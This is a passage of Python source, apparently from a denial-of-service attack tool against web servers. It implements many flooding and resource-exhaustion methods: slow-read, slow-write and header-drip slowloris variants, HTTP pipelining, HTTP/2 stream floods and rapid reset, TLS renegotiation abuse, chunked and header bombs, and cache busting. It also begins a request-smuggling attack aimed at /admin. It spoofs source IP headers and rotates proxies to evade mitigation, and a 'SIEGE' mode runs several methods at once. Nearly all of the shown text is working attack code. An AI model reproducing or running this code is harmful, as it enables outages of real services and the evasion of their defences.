        if proxy_pool.has(): line += f" | {C.CY}Proxy:{C.RST} {proxy_pool.count()}"
        line += f" | {e}/{duration}s"
        sys.stdout.write(line); sys.stdout.flush(); time.sleep(0.3)
    sys.stdout.write("\n")

def show_summary(name, target, port, duration):
    print(f"\n  {C.CY}{'─' * 56}{C.RST}")
    print(f"  {C.BOLD}ATTACK SUMMARY{C.RST}")
    print(f"  {C.CY}{'─' * 56}{C.RST}")
    print(f"  {C.DIM}Method:{C.RST}       {name}")
    print(f"  {C.DIM}Target:{C.RST}       {target}:{port}")
    print(f"  {C.DIM}Duration:{C.RST}     {duration}s")
    print(f"  {C.DIM}Sent:{C.RST}         {C.G}{stats.sent:,}{C.RST}")
    print(f"  {C.DIM}Errors:{C.RST}       {C.R}{stats.errors:,}{C.RST}")
    print(f"  {C.DIM}Peak Active:{C.RST}  {C.B}{stats.peak_active:,}{C.RST}")
    print(f"  {C.DIM}Total Conns:{C.RST}  {stats.total_conns:,}")
    print(f"  {C.DIM}Peak PPS:{C.RST}     {C.Y}{stats.peak_pps:,}{C.RST}")
    print(f"  {C.DIM}Peak BW:{C.RST}      {C.M}{stats.peak_bw_str()}{C.RST}")
    if stats.amp_factor > 0: print(f"  {C.DIM}Amplified:{C.RST}    {C.R}{stats.amp_factor}x{C.RST}")
    if stats.proxy_errors > 0: print(f"  {C.DIM}Proxy Errors:{C.RST} {stats.proxy_errors:,}")
    codes = stats.top_codes(5)
    if codes:
        code_str = "  ".join(f"{k}: {v:,}" for k, v in codes)
        print(f"  {C.DIM}Status Codes:{C.RST}  {code_str}")
    print(f"  {C.CY}{'─' * 56}{C.RST}")

def save_history(name, target, port, duration):
    global last_result
    last_result = (f"{name} | Sent: {stats.sent:,} | Active: {stats.peak_active:,} "
                   f"| PPS: {stats.peak_pps:,} | BW: {stats.peak_bw_str()}")
    log.info(last_result)
    history.append({
        "method": name, "target": target, "port": port, "duration": duration,
        "sent": stats.sent, "errors": stats.errors, "peak_pps": stats.peak_pps,
        "peak_bw": stats.peak_bw_str(), "amp": stats.amp_factor,
        "peak_active": stats.peak_active,
        "timestamp": datetime.now().strftime("%H:%M:%S")
    })

async def execute_async(name, coro_fn, target, port, duration, concurrency, use_proxy=False):
    running = [True]; stats.reset(); stats.start_time = time.time()
    m = threading.Thread(target=monitor, args=(name, duration, running), daemon=True); m.start()
    sem = asyncio.Semaphore(concurrency)
    async def worker():
        while running[0]:
            async with sem:
                if not running[0]: break
                try:
                    await coro_fn(target, port, running, use_proxy)
                except Exception: stats.add_error()
    tasks = [asyncio.ensure_future(worker()) for _ in range(concurrency)]
    start = time.time()
    try:
        while time.time() - start < duration and running[0]: await asyncio.sleep(0.1)
    except asyncio.CancelledError: pass
    running[0] = False
    for t in tasks: t.cancel()
    await asyncio.gather(*tasks, return_exceptions=True)
    time.sleep(0.5); save_history(name, target, port, duration)
    show_summary(name, target, port, duration)

def execute_threaded(name, fn, target, port, duration, threads):
    running = [True]; stats.reset(); stats.start_time = time.time()
    m = threading.Thread(target=monitor, args=(name, duration, running), daemon=True); m.start()
    for _ in range(threads):
        threading.Thread(target=fn, args=(target, port, running), daemon=True).start()
    start = time.time()
    try:
        while time.time() - start < duration: time.sleep(0.1)
    except KeyboardInterrupt: print(f"\n{C.Y}[!] Interrupted{C.RST}")
    running[0] = False; time.sleep(0.5)
    save_history(name, target, port, duration); show_summary(name, target, port, duration)

def execute_siege(target, port, duration, concurrency, methods_list, use_proxy=False):
    running = [True]; stats.reset(); stats.start_time = time.time()
    m = threading.Thread(target=monitor, args=("SIEGE", duration, running), daemon=True); m.start()
    c_per = max(1, concurrency // len(methods_list))
    async def runner():
        sem = asyncio.Semaphore(c_per)
        async def worker(coro_fn):
            while running[0]:
                async with sem:
                    if not running[0]: break
                    try: await coro_fn(target, port, running, use_proxy)
                    except Exception: stats.add_error()
        tasks = [asyncio.ensure_future(worker(fn)) for fn in methods_list for _ in range(c_per)]
        start = time.time()
        try:
            while time.time() - start < duration and running[0]: await asyncio.sleep(0.1)
        except asyncio.CancelledError: pass
        running[0] = False
        for t in tasks: t.cancel()
        await asyncio.gather(*tasks, return_exceptions=True)
    loop = asyncio.new_event_loop(); asyncio.set_event_loop(loop)
    try: loop.run_until_complete(runner())
    except KeyboardInterrupt: running[0] = False
    finally: loop.close()
    time.sleep(0.5); save_history(f"SIEGE ({len(methods_list)})", target, port, duration)
    show_summary(f"SIEGE ({len(methods_list)})", target, port, duration)

def get_aiohttp_connector(use_proxy=False):
    if use_proxy and proxy_pool.has():
        return aiohttp.TCPConnector(limit=0, limit_per_host=0, force_close=False,
            enable_cleanup_closed=True, keepalive_timeout=300, verify_ssl=False)
    return aiohttp.TCPConnector(limit=0, limit_per_host=0, force_close=False,
        enable_cleanup_closed=True, keepalive_timeout=300, verify_ssl=False)

async def ka_slow_read(target, port, running, use_proxy=False):
    try:
        reader, writer = await asyncio.wait_for(asyncio.open_connection(target, port), timeout=5)
        stats.add_conn()
        req = (f"GET / HTTP/1.1\r\nHost: {target}\r\nUser-Agent: {random.choice(AGENTS)}\r\n"
               f"Accept: {random.choice(ACCEPT_TYPES)}\r\nAccept-Language: {random.choice(LANGS)}\r\n"
               f"Connection: keep-alive\r\nCache-Control: {random.choice(CACHE_CONTROL)}\r\n\r\n")
        writer.write(req.encode()); await writer.drain()
        stats.add_sent(1, len(req))
        stats.set_active(max(0, stats.active + 1))
        while running[0]:
            try:
                data = await asyncio.wait_for(reader.read(1), timeout=30)
                if not data: break
                stats.add_sent(1, 1)
                await asyncio.sleep(random.uniform(2, 8))
            except asyncio.TimeoutError: break
            except: break
        try: writer.close(); await writer.wait_closed()
        except: pass
        stats.set_active(max(0, stats.active - 1))
    except: stats.add_error()

async def ka_slow_write(target, port, running, use_proxy=False):
    try:
        reader, writer = await asyncio.wait_for(asyncio.open_connection(target, port), timeout=5)
        stats.add_conn()
        body_size = random.randint(50000, 500000)
        req = (f"POST /upload HTTP/1.1\r\nHost: {target}\r\n"
               f"User-Agent: {random.choice(AGENTS)}\r\n"
               f"Content-Type: application/octet-stream\r\n"
               f"Content-Length: {body_size}\r\n"
               f"Accept: {random.choice(ACCEPT_TYPES)}\r\n"
               f"Connection: keep-alive\r\n\r\n")
        writer.write(req.encode()); await writer.drain()
        stats.add_sent(1, len(req))
        stats.set_active(max(0, stats.active + 1))
        sent = 0
        while running[0] and sent < body_size:
            chunk = os.urandom(random.randint(1, 5))
            try:
                writer.write(chunk); await writer.drain()
                sent += len(chunk); stats.add_sent(1, len(chunk))
                await asyncio.sleep(random.uniform(1, 5))
            except: break
        try: writer.close(); await writer.wait_closed()
        except: pass
        stats.set_active(max(0, stats.active - 1))
    except: stats.add_error()

async def ka_tls_renegotiation(target, port, running, use_proxy=False):
    try:
        ctx = ssl.create_default_context(); ctx.check_hostname = False; ctx.verify_mode = ssl.CERT_NONE
        reader, writer = await asyncio.wait_for(asyncio.open_connection(target, port, ssl=ctx), timeout=5)
        stats.add_conn(); stats.set_active(max(0, stats.active + 1))
        raw_sock = writer.get_extra_info("socket")
        while running[0]:
            try:
                req = (f"GET /?{random.randint(0,99999)} HTTP/1.1\r\nHost: {target}\r\n"
                       f"User-Agent: {random.choice(AGENTS)}\r\nConnection: keep-alive\r\n\r\n")
                writer.write(req.encode()); await writer.drain()
                stats.add_sent(1, len(req))
                try: await asyncio.wait_for(reader.read(1024), timeout=2)
                except: pass
                if raw_sock and hasattr(raw_sock, "recv"):
                    try:
                        raw_sock.send(b"\x16\x03\x01\x00\x01\x01")
                        stats.add_sent(1, 6)
                    except: break
                await asyncio.sleep(0.01)
            except: break
        try: writer.close(); await writer.wait_closed()
        except: pass
        stats.set_active(max(0, stats.active - 1))
    except: stats.add_error()

async def ka_http_pipelining(target, port, running, use_proxy=False):
    try:
        reader, writer = await asyncio.wait_for(asyncio.open_connection(target, port), timeout=5)
        stats.add_conn(); stats.set_active(max(0, stats.active + 1))
        while running[0]:
            pipeline = ""
            count = random.randint(50, 200)
            for _ in range(count):
                method = random.choice(HTTP_METHODS); path = random.choice(PATHS)
                pipeline += (f"{method} {path} HTTP/1.1\r\nHost: {target}\r\n"
                             f"User-Agent: {random.choice(AGENTS)}\r\n"
                             f"Accept: {random.choice(ACCEPT_TYPES)}\r\n"
                             f"Connection: keep-alive\r\n\r\n")
            data = pipeline.encode()
            try:
                writer.write(data); await writer.drain()
                stats.add_sent(count, len(data))
                await asyncio.sleep(random.uniform(0.01, 0.05))
            except: break
        try: writer.close(); await writer.wait_closed()
        except: pass
        stats.set_active(max(0, stats.active - 1))
    except: stats.add_error()

async def ka_chunked_slow(target, port, running, use_proxy=False):
    try:
        reader, writer = await asyncio.wait_for(asyncio.open_connection(target, port), timeout=5)
        stats.add_conn(); stats.set_active(max(0, stats.active + 1))
        req = (f"POST /api/upload HTTP/1.1\r\nHost: {target}\r\n"
               f"User-Agent: {random.choice(AGENTS)}\r\n"
               f"Transfer-Encoding: chunked\r\n"
               f"Accept: {random.choice(ACCEPT_TYPES)}\r\n"
               f"Connection: keep-alive\r\n\r\n")
        writer.write(req.encode()); await writer.drain()
        stats.add_sent(1, len(req))
        while running[0]:
            chunk_size = random.randint(1, 16)
            chunk_data = os.urandom(chunk_size)
            chunk = f"{chunk_size:x}\r\n".encode() + chunk_data + b"\r\n"
            try:
                writer.write(chunk); await writer.drain()
                stats.add_sent(1, len(chunk))
                await asyncio.sleep(random.uniform(2, 15))
            except: break
        try: writer.write(b"0\r\n\r\n"); await writer.drain()
        except: pass
        try: writer.close(); await writer.wait_closed()
        except: pass
        stats.set_active(max(0, stats.active - 1))
    except: stats.add_error()

async def ka_aiohttp_siege(target, port, running, use_proxy=False):
    timeout = aiohttp.ClientTimeout(total=0, connect=5, sock_read=60, sock_connect=5)
    connector = get_aiohttp_connector(use_proxy)
    headers = {"User-Agent": random.choice(AGENTS), "Accept": random.choice(ACCEPT_TYPES),
        "Accept-Language": random.choice(LANGS), "Accept-Encoding": random.choice(ENCODINGS),
        "X-Forwarded-For": rand_ip(), "Connection": "keep-alive",
        "Keep-Alive": "timeout=300, max=10000", "Cache-Control": random.choice(CACHE_CONTROL)}
    proxy_url = None
    if use_proxy and proxy_pool.has():
        _, proxy_url = proxy_pool.get_url()
    try:
        async with aiohttp.ClientSession(timeout=timeout, connector=connector, headers=headers) as session:
            url = f"http://{target}:{port}{random.choice(PATHS)}"
            stats.add_conn(); stats.set_active(max(0, stats.active + 1))
            while running[0]:
                try:
                    kwargs = {"ssl": False}
                    if proxy_url: kwargs["proxy"] = proxy_url
                    async with session.get(url, **kwargs) as resp:
                        stats.add_sent(1)
                        stats.add_status(resp.status)
                        try: await resp.read()
                        except: pass
                    await asyncio.sleep(0.001)
                except aiohttp.ClientError:
                    stats.add_error()
                    if proxy_url: stats.add_proxy_error()
                    await asyncio.sleep(0.1)
                    break
                except Exception:
                    stats.add_error()
                    await asyncio.sleep(0.1)
                    break
        stats.set_active(max(0, stats.active - 1))
    except: stats.add_error()

async def ka_expect_continue(target, port, running, use_proxy=False):
    try:
        reader, writer = await asyncio.wait_for(asyncio.open_connection(target, port), timeout=5)
        stats.add_conn(); stats.set_active(max(0, stats.active + 1))
        body_size = random.randint(500000, 5000000)
        req = (f"POST /api/data HTTP/1.1\r\nHost: {target}\r\n"
               f"User-Agent: {random.choice(AGENTS)}\r\n"
               f"Content-Type: application/octet-stream\r\n"
               f"Content-Length: {body_size}\r\n"
               f"Expect: 100-continue\r\n"
               f"Accept: {random.choice(ACCEPT_TYPES)}\r\n"
               f"Connection: keep-alive\r\n\r\n")
        writer.write(req.encode()); await writer.drain()
        stats.add_sent(1, len(req))
        while running[0]:
            try:
                data = await asyncio.wait_for(reader.read(1024), timeout=30)
                if not data: break
            except asyncio.TimeoutError:
                writer.write(os.urandom(1)); await writer.drain()
                stats.add_sent(1, 1)
                await asyncio.sleep(random.uniform(5, 20))
            except: break
        try: writer.close(); await writer.wait_closed()
        except: pass
        stats.set_active(max(0, stats.active - 1))
    except: stats.add_error()

async def ka_websocket_hold(target, port, running, use_proxy=False):
    try:
        reader, writer = await asyncio.wait_for(asyncio.open_connection(target, port), timeout=5)
        stats.add_conn(); stats.set_active(max(0, stats.active + 1))
        ws_key = os.urandom(16).hex()
        ws_path = random.choice(["/ws", "/websocket", "/socket.io/?EIO=4&transport=websocket", "/live", "/stream"])
        req = (f"GET {ws_path} HTTP/1.1\r\nHost: {target}:{port}\r\n"
               f"User-Agent: {random.choice(AGENTS)}\r\n"
               f"Upgrade: websocket\r\nConnection: Upgrade\r\n"
               f"Sec-WebSocket-Key: {ws_key}\r\n"
               f"Sec-WebSocket-Version: 13\r\n"
               f"Sec-WebSocket-Extensions: permessage-deflate\r\n"
               f"Origin: http://{target}:{port}\r\n\r\n")
        writer.write(req.encode()); await writer.drain()
        stats.add_sent(1, len(req))
        try: await asyncio.wait_for(reader.read(1024), timeout=3)
        except: pass
        while running[0]:
            try:
                payload = os.urandom(random.randint(1, 125))
                frame = b"\x81" + bytes([len(payload)]) + payload
                writer.write(frame); await writer.drain()
                stats.add_sent(1, len(frame))
                await asyncio.sleep(random.uniform(10, 60))
            except: break
        try: writer.close(); await writer.wait_closed()
        except: pass
        stats.set_active(max(0, stats.active - 1))
    except: stats.add_error()

async def ka_h2_stream_flood(target, port, running, use_proxy=False):
    if not H2_OK: stats.add_error(); return
    try:
        reader, writer = await asyncio.wait_for(asyncio.open_connection(target, port), timeout=5)
        stats.add_conn(); stats.set_active(max(0, stats.active + 1))
        preface = b"PRI * HTTP/2.0\r\n\r\nSM\r\n\r\n"
        writer.write(preface)
        config = h2.config.H2Configuration(client_side=True, header_encoding="utf-8")
        conn = h2.connection.H2Connection(config=config)
        conn.initiate_connection()
        writer.write(conn.data_to_send()); await writer.drain()
        stats.add_sent(1, len(preface))
        stream_count = 0
        while running[0]:
            try:
                stream_id = conn.get_next_available_stream_id()
                conn.send_headers(stream_id, [
                    (":method", random.choice(["GET", "POST"])),
                    (":path", random.choice(PATHS)),
                    (":scheme", "http"), (":authority", f"{target}:{port}"),
                    ("user-agent", random.choice(AGENTS)),
                    ("accept", random.choice(ACCEPT_TYPES)),
                    ("x-forwarded-for", rand_ip()),
                ])
                conn.send_data(stream_id, b"", end_stream=True)
                writer.write(conn.data_to_send()); await writer.drain()
                stats.add_sent(1, 100)
                stream_count += 1
                if stream_count % 100 == 0:
                    try:
                        data = await asyncio.wait_for(reader.read(65535), timeout=0.1)
                        if data:
                            events = conn.receive_data(data)
                            writer.write(conn.data_to_send()); await writer.drain()
                    except: pass
                if stream_count > 10000:
                    conn.close_connection()
                    writer.write(conn.data_to_send()); await writer.drain()
                    break
                await asyncio.sleep(0.001)
            except: break
        try: writer.close(); await writer.wait_closed()
        except: pass
        stats.set_active(max(0, stats.active - 1))
    except: stats.add_error()

async def ka_header_drip(target, port, running, use_proxy=False):
    try:
        reader, writer = await asyncio.wait_for(asyncio.open_connection(target, port), timeout=5)
        stats.add_conn(); stats.set_active(max(0, stats.active + 1))
        headers = [
            f"GET {obfuscate_path(random.choice(PATHS))} HTTP/1.1\r\n",
            f"Host: {target}\r\n",
            f"User-Agent: {random.choice(AGENTS)}\r\n",
            f"Accept: {random.choice(ACCEPT_TYPES)}\r\n",
            f"Accept-Language: {random.choice(LANGS)}\r\n",
            f"Accept-Encoding: {random.choice(ENCODINGS)}\r\n",
            f"Cache-Control: {random.choice(CACHE_CONTROL)}\r\n",
            f"Cookie: {gen_random_cookie()}\r\n",
            f"X-Forwarded-For: {rand_ip()}\r\n",
            f"X-Real-IP: {rand_ip()}\r\n",
            f"Via: 1.1 proxy{random.randint(1,999)}.local\r\n",
            f"Connection: keep-alive\r\n",
        ]
        random.shuffle(headers[3:])
        for h in headers:
            if not running[0]: break
            for char in h:
                if not running[0]: break
                try:
                    writer.write(char.encode()); await writer.drain()
                    stats.add_sent(1, 1)
                    await asyncio.sleep(random.uniform(0.05, 0.3))
                except: break
        try: writer.write(b"\r\n"); await writer.drain()
        except: pass
        while running[0]:
            try:
                data = await asyncio.wait_for(reader.read(1), timeout=30)
                if not data: break
                await asyncio.sleep(random.uniform(2, 8))
            except: break
        try: writer.close(); await writer.wait_closed()
        except: pass
        stats.set_active(max(0, stats.active - 1))
    except: stats.add_error()

async def ka_proxy_flood(target, port, running, use_proxy=False):
    if not use_proxy or not proxy_pool.has():
        stats.add_error(); return
    timeout = aiohttp.ClientTimeout(total=10, connect=5, sock_read=5)
    connector = aiohttp.TCPConnector(limit=0, limit_per_host=0, force_close=True, verify_ssl=False)
    headers = {"User-Agent": random.choice(AGENTS), "Accept": random.choice(ACCEPT_TYPES),
        "Accept-Language": random.choice(LANGS), "X-Forwarded-For": rand_ip()}
    try:
        async with aiohttp.ClientSession(timeout=timeout, connector=connector, headers=headers) as session:
            _, proxy_url = proxy_pool.get_url()
            if not proxy_url: return
            url = f"http://{target}:{port}{random.choice(PATHS)}"
            stats.add_conn()
            try:
                async with session.get(url, proxy=proxy_url, ssl=False) as resp:
                    stats.add_sent(1)
                    stats.add_status(resp.status)
                    try: await resp.read()
                    except: pass
            except: stats.add_error(); stats.add_proxy_error()
    except: stats.add_error()

async def ka_connection_recycle(target, port, running, use_proxy=False):
    try:
        reader, writer = await asyncio.wait_for(asyncio.open_connection(target, port), timeout=5)
        stats.add_conn(); stats.set_active(max(0, stats.active + 1))
        req_count = 0
        while running[0]:
            method = random.choice(HTTP_METHODS)
            path = obfuscate_path(random.choice(PATHS))
            req = (f"{method} {path} HTTP/1.1\r\nHost: {target}\r\n"
                   f"User-Agent: {random.choice(AGENTS)}\r\n"
                   f"Accept: {random.choice(ACCEPT_TYPES)}\r\n"
                   f"Accept-Language: {random.choice(LANGS)}\r\n"
                   f"Cookie: {gen_random_cookie()}\r\n"
                   f"X-Forwarded-For: {rand_ip()}\r\n"
                   f"Connection: keep-alive\r\n"
                   f"Keep-Alive: timeout=300, max=1000\r\n\r\n")
            try:
                writer.write(req.encode()); await writer.drain()
                stats.add_sent(1, len(req))
                data = await asyncio.wait_for(reader.read(8192), timeout=5)
                if not data: break
                stats.add_status(200)
                req_count += 1
                if req_count % random.randint(10, 50) == 0:
                    await asyncio.sleep(random.uniform(0.1, 0.5))
                else:
                    await asyncio.sleep(random.uniform(0.001, 0.01))
            except asyncio.TimeoutError: break
            except: break
        try: writer.close(); await writer.wait_closed()
        except: pass
        stats.set_active(max(0, stats.active - 1))
    except: stats.add_error()

async def ka_browser_simulator(target, port, running, use_proxy=False):
    try:
        reader, writer = await asyncio.wait_for(asyncio.open_connection(target, port), timeout=5)
        stats.add_conn(); stats.set_active(max(0, stats.active + 1))
        ua = random.choice(AGENTS)
        cookie_jar = gen_random_cookie()
        page_req = (f"GET / HTTP/1.1\r\nHost: {target}\r\nUser-Agent: {ua}\r\n"
                    f"Accept: {random.choice(ACCEPT_TYPES)}\r\n"
                    f"Accept-Language: {random.choice(LANGS)}\r\n"
                    f"Accept-Encoding: {random.choice(ENCODINGS)}\r\n"
                    f"Cookie: {cookie_jar}\r\n"
                    f"Connection: keep-alive\r\n\r\n")
        writer.write(page_req.encode()); await writer.drain()
        stats.add_sent(1, len(page_req))
        try: await asyncio.wait_for(reader.read(8192), timeout=3)
        except: pass
        resources = ["/style.css", "/main.js", "/app.js", "/favicon.ico", "/logo.png",
                     "/assets/img/bg.jpg", "/static/js/vendor.js", "/static/css/main.css"]
        for res in resources:
            if not running[0]: break
            res_req = (f"GET {res} HTTP/1.1\r\nHost: {target}\r\nUser-Agent: {ua}\r\n"
                       f"Accept: */*\r\nReferer: http://{target}/\r\n"
                       f"Cookie: {cookie_jar}\r\nConnection: keep-alive\r\n\r\n")
            try:
                writer.write(res_req.encode()); await writer.drain()
                stats.add_sent(1, len(res_req))
                await asyncio.wait_for(reader.read(4096), timeout=2)
                await asyncio.sleep(random.uniform(0.05, 0.2))
            except: break
        while running[0]:
            path = obfuscate_path(random.choice(PATHS))
            nav_req = (f"GET {path} HTTP/1.1\r\nHost: {target}\r\nUser-Agent: {ua}\r\n"
                       f"Accept: {random.choice(ACCEPT_TYPES)}\r\n"
                       f"Referer: http://{target}/\r\nCookie: {cookie_jar}\r\n"
                       f"Connection: keep-alive\r\n\r\n")
            try:
                writer.write(nav_req.encode()); await writer.drain()
                stats.add_sent(1, len(nav_req))
                await asyncio.wait_for(reader.read(8192), timeout=3)
                await asyncio.sleep(random.uniform(0.5, 3))
            except: break
        try: writer.close(); await writer.wait_closed()
        except: pass
        stats.set_active(max(0, stats.active - 1))
    except: stats.add_error()

async def ka_chunked_bomb(target, port, running, use_proxy=False):
    try:
        reader, writer = await asyncio.wait_for(asyncio.open_connection(target, port), timeout=5)
        stats.add_conn(); stats.set_active(max(0, stats.active + 1))
        req = (f"POST /api/upload HTTP/1.1\r\nHost: {target}\r\n"
               f"User-Agent: {random.choice(AGENTS)}\r\n"
               f"Transfer-Encoding: chunked\r\n"
               f"Content-Type: application/octet-stream\r\n"
               f"Connection: keep-alive\r\n\r\n")
        writer.write(req.encode()); await writer.drain()
        stats.add_sent(1, len(req))
        while running[0]:
            chunk_size = random.choice([1, 2, 4, 8, 16, 32, 64, 128, 256, 512, 1024])
            chunk_data = os.urandom(chunk_size)
            chunk = f"{chunk_size:x}\r\n".encode() + chunk_data + b"\r\n"
            try:
                writer.write(chunk); await writer.drain()
                stats.add_sent(1, len(chunk))
                await asyncio.sleep(random.uniform(0.1, 1))
            except: break
        try: writer.write(b"0\r\n\r\n"); await writer.drain()
        except: pass
        try: writer.close(); await writer.wait_closed()
        except: pass
        stats.set_active(max(0, stats.active - 1))
    except: stats.add_error()

async def ka_partial_request(target, port, running, use_proxy=False):
    try:
        reader, writer = await asyncio.wait_for(asyncio.open_connection(target, port), timeout=5)
        stats.add_conn(); stats.set_active(max(0, stats.active + 1))
        method = random.choice(HTTP_METHODS)
        path = obfuscate_path(random.choice(PATHS))
        partial_req = f"{method} {path} HTTP/1.1\r\nHost: {target}\r\n"
        writer.write(partial_req.encode()); await writer.drain()
        stats.add_sent(1, len(partial_req))
        while running[0]:
            header_name = f"X-{random.choice(['Request', 'Data', 'Payload', 'Custom', 'Header', 'Info', 'Meta'])}-{random.randint(1,9999)}"
            header_value = os.urandom(random.randint(32, 256)).hex()
            header = f"{header_name}: {header_value}\r\n"
            try:
                writer.write(header.encode()); await writer.drain()
                stats.add_sent(1, len(header))
                await asyncio.sleep(random.uniform(0.5, 3))
            except: break
        try: writer.close(); await writer.wait_closed()
        except: pass
        stats.set_active(max(0, stats.active - 1))
    except: stats.add_error()

async def async_http_flood(target, port, running, use_proxy=False):
    if use_proxy and proxy_pool.has():
        await ka_proxy_flood(target, port, running, use_proxy)
        return
    try:
        reader, writer = await asyncio.wait_for(asyncio.open_connection(target, port), timeout=3)
        method = random.choice(HTTP_METHODS); path = obfuscate_path(random.choice(PATHS))
        ua = random.choice(AGENTS); lang = random.choice(LANGS)
        enc = random.choice(ENCODINGS); cookie = gen_random_cookie(); xff = rand_ip()
        req = (f"{method} {path} HTTP/1.1\r\nHost: {target}\r\nUser-Agent: {ua}\r\n"
               f"Accept: {random.choice(ACCEPT_TYPES)}\r\nAccept-Language: {lang}\r\n"
               f"Accept-Encoding: {enc}\r\nCache-Control: {random.choice(CACHE_CONTROL)}\r\n"
               f"Pragma: no-cache\r\nX-Forwarded-For: {xff}\r\nX-Real-IP: {xff}\r\n"
               f"Via: 1.1 proxy{random.randint(1,999)}.local\r\nCookie: {cookie}\r\n"
               f"Connection: close\r\n\r\n")
        data = req.encode(); writer.write(data); await writer.drain()
        stats.add_sent(1, len(data))
        try:
            resp = await asyncio.wait_for(reader.read(1024), timeout=1)
            if resp:
                resp_str = resp.decode(errors="ignore")
                for code in ["200", "301", "302", "303", "307", "308", "400", "401", "403", "404", "429", "500", "502", "503"]:
                    if f" {code} " in resp_str:
                        stats.add_status(code); break
        except: pass
        writer.close()
        try: await writer.wait_closed()
        except: pass
    except: stats.add_error()

async def async_http_post_bomber(target, port, running, use_proxy=False):
    try:
        reader, writer = await asyncio.wait_for(asyncio.open_connection(target, port), timeout=4)
        body, bs = gen_post_body()
        req = (f"POST {random.choice(PATHS)} HTTP/1.1\r\nHost: {target}\r\n"
               f"User-Agent: {random.choice(AGENTS)}\r\n"
               f"Content-Type: application/x-www-form-urlencoded\r\n"
               f"Content-Length: {bs}\r\nX-Forwarded-For: {rand_ip()}\r\n"
               f"Expect: 100-continue\r\nConnection: close\r\n\r\n{body}")
        data = req.encode(); writer.write(data); await writer.drain()
        stats.add_sent(1, len(data)); writer.close()
        try: await writer.wait_closed()
        except: pass
    except: stats.add_error()

async def async_http2_rapid_reset(target, port, running, use_proxy=False):
    try:
        reader, writer = await asyncio.wait_for(asyncio.open_connection(target, port), timeout=3)
        preface = b"PRI * HTTP/2.0\r\n\r\nSM\r\n\r\n"
        settings = b"\x00\x00\x00\x04\x00\x00\x00\x00\x00"
        writer.write(preface + settings); await writer.drain()
        stats.add_sent(1, len(preface + settings))
        for _ in range(random.randint(50, 200)):
            if not running[0]: break
            sid = (random.randint(1, 1000) * 2) + 1
            if sid > 2147483647: sid = sid % 2147483647
            hf = struct.pack("!3sBBI", b"\x00\x00\x05", 0x04, 0x00, sid)
            rf = struct.pack("!3sBBI", b"\x00\x00\x04", 0x03, 0x00, sid)
            rp = struct.pack("!I", 0x08)
            writer.write(hf + rf + rp)
            stats.add_sent(2, len(hf) + len(rf) + len(rp))
        await writer.drain(); writer.close()
        try: await writer.wait_closed()
        except: pass
    except: stats.add_error()

async def async_cache_buster(target, port, running, use_proxy=False):
    try:
        reader, writer = await asyncio.wait_for(asyncio.open_connection(target, port), timeout=3)
        tokens = [f"cb={random.randint(0,999999999)}", f"t={int(time.time())}b{random.randint(0,999)}",
                  f"r={random.randint(0,999999)}", f"nonce={os.urandom(8).hex()}",
                  f"_={random.randint(10**9,10**10)}", f"cache={os.urandom(4).hex()}",
                  f"v={os.urandom(4).hex()}", f"s={random.randint(0,99999)}"]
        random.shuffle(tokens)
        qs = "&".join(tokens[:random.randint(3, 6)])
        req = (f"GET {random.choice(PATHS)}?{qs} HTTP/1.1\r\nHost: {target}\r\n"
               f"User-Agent: {random.choice(AGENTS)}\r\n"
               f"Cache-Control: no-cache, no-store, must-revalidate\r\nPragma: no-cache\r\n"
               f"Expires: 0\r\nIf-None-Match: \"{os.urandom(8).hex()}\"\r\n"
               f"If-Modified-Since: Thu, 01 Jan 2020 00:00:00 GMT\r\n"
               f"X-Forwarded-For: {rand_ip()}\r\nConnection: close\r\n\r\n")
        data = req.encode(); writer.write(data); await writer.drain()
        stats.add_sent(1, len(data)); writer.close()
        try: await writer.wait_closed()
        except: pass
    except: stats.add_error()

async def async_header_bomb(target, port, running, use_proxy=False):
    try:
        reader, writer = await asyncio.wait_for(asyncio.open_connection(target, port), timeout=3)
        huge = gen_huge_headers()
        req = (f"GET {random.choice(PATHS)} HTTP/1.1\r\nHost: {target}\r\n"
               f"User-Agent: {random.choice(AGENTS)}\r\n{huge}"
               f"X-Forwarded-For: {rand_ip()}\r\nConnection: close\r\n\r\n")
        data = req.encode(); writer.write(data); await writer.drain()
        stats.add_sent(1, len(data)); writer.close()
        try: await writer.wait_closed()
        except: pass
    except: stats.add_error()

async def async_https_flood(target, port, running, use_proxy=False):
    try:
        ctx = ssl.create_default_context(); ctx.check_hostname = False; ctx.verify_mode = ssl.CERT_NONE
        reader, writer = await asyncio.wait_for(
            asyncio.open_connection(target, port, ssl=ctx), timeout=4)
        req = (f"{random.choice(HTTP_METHODS)} {obfuscate_path(random.choice(PATHS))} HTTP/1.1\r\n"
               f"Host: {target}\r\nUser-Agent: {random.choice(AGENTS)}\r\n"
               f"Accept: {random.choice(ACCEPT_TYPES)}\r\nX-Forwarded-For: {rand_ip()}\r\nConnection: close\r\n\r\n")
        data = req.encode(); writer.write(data); await writer.drain()
        stats.add_sent(1, len(data))
        try: await asyncio.wait_for(reader.read(1024), timeout=1)
        except: pass
        writer.close()
        try: await writer.wait_closed()
        except: pass
    except: stats.add_error()

async def async_tcp_connect(target, port, running, use_proxy=False):
    try:
        reader, writer = await asyncio.wait_for(asyncio.open_connection(target, port), timeout=2)
        stats.add_sent()
        try: writer.write(b"\x00"); await writer.drain()
        except: pass
        writer.close()
        try: await writer.wait_closed()
        except: pass
    except: stats.add_error()

async def async_fragmented_http(target, port, running, use_proxy=False):
    try:
        reader, writer = await asyncio.wait_for(asyncio.open_connection(target, port), timeout=5)
        parts = [f"GET {random.choice(PATHS)} HTTP/1.1\r\n".encode(),
                 f"Host: {target}\r\n".encode(),
                 f"User-Agent: {random.choice(AGENTS)}\r\n".encode(),
                 f"Accept: {random.choice(ACCEPT_TYPES)}\r\n".encode(),
                 f"X-Forwarded-For: {rand_ip()}\r\n".encode(),
                 f"Content-Length: {random.randint(10000,99999)}\r\n".encode(),
                 b"\r\n"]
        for p in parts:
            if not running[0]: break
            writer.write(p); await writer.drain()
            stats.add_sent(1, len(p))
            await asyncio.sleep(random.uniform(0.05, 0.3))
        try: writer.write(os.urandom(random.randint(100, 1000))); await writer.drain()
        except: pass
        writer.close()
        try: await writer.wait_closed()
        except: pass
    except: stats.add_error()

async def async_smuggle_clte(target, port, running, use_proxy=False):
    try:
        reader, writer = await asyncio.wait_for(asyncio.open_connection(target, port), timeout=5)
        stats.add_conn(); stats.set_active(max(0, stats.active + 1))
        body1 = f"0\r\n\r\nGET /admin HTTP/1.1\r\nHost: {target}\r\n"
        req = (f"POST / HTTP/1.1\r\nHost: {target}\r\n"
               f"Content-Length: {len(body1) + 10}\r\n"
               f"Transfer-Encoding: chunked\r\n"
               f"User-Agent: {random.choice(AGENTS)}\r\n"
